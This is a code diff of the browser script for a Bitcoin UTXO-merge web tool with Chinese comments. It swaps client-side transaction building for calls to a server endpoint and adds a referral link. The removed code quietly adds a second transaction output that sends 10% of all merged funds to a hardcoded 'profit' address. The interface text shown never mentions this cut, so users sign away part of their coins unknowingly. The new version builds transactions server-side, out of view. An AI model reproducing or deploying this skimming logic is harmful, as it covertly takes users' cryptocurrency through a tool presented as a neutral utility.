@@ -1,121 +1,112 @@
-document.addEventListener('DOMContentLoaded', async () => {
-    let walletProvider = null;
-    let walletAddress = null;
-    let targetAddress = null;
-    const profitAddress = '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd'; // 你的收益地址
-    const profitRate = 0.1; // 10% 收益
-
-    const connectButton = document.getElementById('connectWallet');
-    const disconnectButton = document.getElementById('disconnectWallet');
-    const walletStatus = document.getElementById('walletStatus');
-    const mergeButton = document.getElementById('mergeButton');
-    const targetAddressInput = document.getElementById('targetAddress');
-    const feeRateInput = document.getElementById('feeRate');
-    const feeRatesDisplay = document.getElementById('feeRates');
-
-    // 获取并显示主网费率
-    const fetchFeeRates = async () => {
-        try {
-            const response = await fetch('/get-fee-rates');
-            const rates = await response.json();
-            feeRatesDisplay.textContent = `快速: ${rates.fastestFee}, 中等: ${rates.halfHourFee}, 慢速: ${rates.hourFee}`;
-            feeRateInput.placeholder = `推荐: ${rates.halfHourFee}`;
-        } catch (error) {
-            feeRatesDisplay.textContent = '无法加载费率';
+// 加载主网费率
+async function loadFeeRates() {
+    try {
+        const response = await fetch('/get-fee-rates');
+        if (!response.ok) {
+            throw new Error(`HTTP 错误: ${response.status}`);
         }
-    };
-    fetchFeeRates();
-
-    // 连接钱包
-    connectButton.addEventListener('click', async () => {
-        try {
-            if (window.unisat) {
-                const accounts = await window.unisat.requestAccounts();
-                walletProvider = 'unisat';
-                walletAddress = accounts[0];
-            } else if (window.okxwallet && window.okxwallet.bitcoin) {
-                const result = await window.okxwallet.bitcoin.connect();
-                walletProvider = 'okx';
-                walletAddress = result.address;
-            } else {
-                alert('请安装UniSat或OKX钱包插件！');
-                return;
-            }
-            walletStatus.textContent = `已连接钱包: ${walletAddress}`;
-            connectButton.style.display = 'none';
-            disconnectButton.style.display = 'inline';
-            mergeButton.disabled = false;
-        } catch (error) {
-            alert(`连接失败: ${error.message}`);
+        const data = await response.json();
+        if (data.error) {
+            throw new Error(data.error);
         }
-    });
+        document.getElementById('fee-rates').textContent = `快速: ${data.fastestFee}, 中等: ${data.halfHourFee}, 慢速: ${data.hourFee}`;
+    } catch (error) {
+        console.error('加载费率失败:', error);
+        document.getElementById('fee-rates').textContent = '无法加载费率';
+    }
+}
 
-    // 断开连接
-    disconnectButton.addEventListener('click', () => {
-        walletProvider = null;
-        walletAddress = null;
-        walletStatus.textContent = '未连接钱包';
-        connectButton.style.display = 'inline';
-        disconnectButton.style.display = 'none';
-        mergeButton.disabled = true;
-    });
+// 显示钱包选择弹窗
+function showWalletOptions() {
+    const walletOptions = `
+        <div id="wallet-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;">
+            <div style="background: white; padding: 20px; border-radius: 10px; text-align: center;">
+                <h3>选择钱包</h3>
+                <button onclick="connectWallet('unisat')">UniSat</button>
+                <button onclick="connectWallet('okxweb3')">OKXWeb3</button>
+                <button onclick="document.getElementById('wallet-modal').remove()">取消</button>
+            </div>
+        </div>
+    `;
+    document.body.insertAdjacentHTML('beforeend', walletOptions);
+}
 
-    // 合并 UTXO 并转账
-    mergeButton.addEventListener('click', async () => {
-        targetAddress = targetAddressInput.value.trim() || walletAddress;
-        const feeRate = parseInt(feeRateInput.value) || 10;
-
-        try {
-            // 获取 UTXO
-            const utxoResponse = await fetch('/get-utxos', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ address: walletAddress })
-            });
-            const { utxos } = await utxoResponse.json();
-            if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');
-
-            // 构造交易
-            const network = Bitcoin.networks.bitcoin; // 主网
-            const txb = new Bitcoin.TransactionBuilder(network);
-            let totalInput = 0;
-            utxos.forEach(utxo => {
-                txb.addInput(utxo.txid, utxo.vout);
-                totalInput += utxo.value;
-            });
-
-            const txSize = utxos.length * 148 + 34 + 10;
-            const fee = txSize * feeRate;
-            const profit = Math.floor(totalInput * profitRate); // 10% 收益
-            const outputValue = totalInput - fee - profit;
-
-            if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');
-
-            // 输出：用户目标地址和你的收益地址
-            txb.addOutput(targetAddress, outputValue);
-            txb.addOutput(profitAddress, profit);
-
-            const psbt = txb.buildIncomplete().toPSBT();
-
-            // 签名
-            let signedTxHex;
-            if (walletProvider === 'unisat') {
-                signedTxHex = await window.unisat.signPsbt(psbt.toHex());
-            } else if (walletProvider === 'okx') {
-                signedTxHex = await window.okxwallet.bitcoin.signPsbt(psbt.toHex());
-            }
-
-            // 广播交易
-            const broadcastResponse = await fetch('/broadcast', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ txHex: signedTxHex })
-            });
-            const { txId } = await broadcastResponse.json();
-
-            document.location.href = `/?message=UTXO合并并转账成功！&txId=${txId}`;
-        } catch (error) {
-            alert(`操作失败: ${error.message}`);
+// 连接钱包
+async function connectWallet(walletType) {
+    try {
+        let accounts;
+        if (walletType === 'unisat' && window.unisat) {
+            accounts = await window.unisat.requestAccounts();
+        } else if (walletType === 'okxweb3' && window.okxwallet) {
+            accounts = await window.okxwallet.bitcoin.requestAccounts();
+        } else {
+            throw new Error('钱包未安装');
         }
-    });
+        document.getElementById('wallet-status').textContent = `已连接钱包: ${accounts[0]}`;
+        document.getElementById('connect-wallet').style.display = 'none';
+        document.getElementById('disconnect-wallet').style.display = 'block';
+        document.getElementById('merge-utxo').disabled = false;
+        document.getElementById('wallet-modal').remove();
+    } catch (error) {
+        console.error('连接钱包失败:', error);
+        document.getElementById('wallet-status').textContent = '连接钱包失败';
+        document.getElementById('wallet-modal').remove();
+    }
+}
+
+// 断开钱包
+function disconnectWallet() {
+    document.getElementById('wallet-status').textContent = '未连接钱包';
+    document.getElementById('connect-wallet').style.display = 'block';
+    document.getElementById('disconnect-wallet').style.display = 'none';
+    document.getElementById('merge-utxo').disabled = true;
+}
+
+// 合并 UTXO 并转账
+document.getElementById('merge-utxo').addEventListener('click', async () => {
+    const walletStatus = document.getElementById('wallet-status').textContent;
+    if (walletStatus === '未连接钱包') {
+        alert('请先链接钱包！');
+        return;
+    }
+
+    const walletAddress = walletStatus.split(': ')[1];
+    const targetAddress = document.getElementById('target-address').value || walletAddress;
+    const customFeeRate = document.getElementById('custom-fee-rate').value || 3;
+
+    try {
+        const response = await fetch('/trade', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ walletAddress, targetAddress, feeRate: customFeeRate })
+        });
+        const data = await response.json();
+        if (data.psbt) {
+            alert('交易已生成，请在钱包中确认！');
+        } else {
+            throw new Error('交易失败');
+        }
+    } catch (error) {
+        console.error('合并 UTXO 失败:', error);
+        alert('合并 UTXO 失败: ' + error.message);
+    }
 });
+
+// 邀请朋友
+document.getElementById('invite-friends').addEventListener('click', () => {
+    const walletStatus = document.getElementById('wallet-status').textContent;
+    if (walletStatus === '未连接钱包') {
+        alert('请先链接钱包！');
+        return;
+    }
+    const walletAddress = walletStatus.split(': ')[1];
+    const inviteUrl = `${window.location.origin}/?ref=${walletAddress}`;
+    const inviteLinkDiv = document.getElementById('invite-link');
+    const inviteUrlElement = document.getElementById('invite-url');
+    inviteUrlElement.href = inviteUrl;
+    inviteUrlElement.textContent = inviteUrl;
+    inviteLinkDiv.style.display = 'block';
+});
+
+// 页面加载时加载费率
+window.onload = loadFeeRates;
